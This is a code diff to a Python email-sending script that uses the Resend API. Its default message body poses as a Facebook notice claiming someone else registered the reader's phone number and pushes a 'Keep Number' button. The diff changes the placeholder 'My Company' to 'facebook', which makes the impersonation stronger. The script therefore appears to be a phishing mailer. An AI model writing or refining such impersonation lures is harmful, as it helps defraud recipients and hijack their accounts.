@@ -47,9 +47,9 @@ EMAIL_REGEX = re.compile(r"^[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}$")
 
 DEFAULT_BODY = """Hi there,
 
-We wanted to let you know that your mobile number was verified and registered by another person on Facebook.
+We wanted to let you know that your mobile number was verified and registered by another person on facebook.
 
-This mobile number is still associated with your account. If you're still receiving SMS notifications from facebook, the person who just confirmed may also see future My Company SMS notifications sent to this number.
+This mobile number is still associated with your account. If you're still receiving SMS notifications from facebook, the person who just confirmed may also see future facebook SMS notifications sent to this number.
 
 If you'd like to continue to keep this number on your account, click the Keep Number button.
 
@@ -280,8 +280,11 @@ def send_resend_email(to_email: str, subject: str, html_content: str) -> request
         "Authorization": f"Bearer {RESEND_API_KEY}",
         "Content-Type": "application/json",
     }
+    # Build from field safely
+    sender_name = SENDER_NAME.strip().replace("<", "").replace(">", "").replace('"', "")
+    from_field = f"{sender_name} <{SENDER_EMAIL}>" if sender_name else SENDER_EMAIL
     payload = {
-        "from": f"{SENDER_NAME} <{SENDER_EMAIL}>",
+        "from": from_field,
         "to": [to_email],
         "subject": subject,
         "html": html_content,
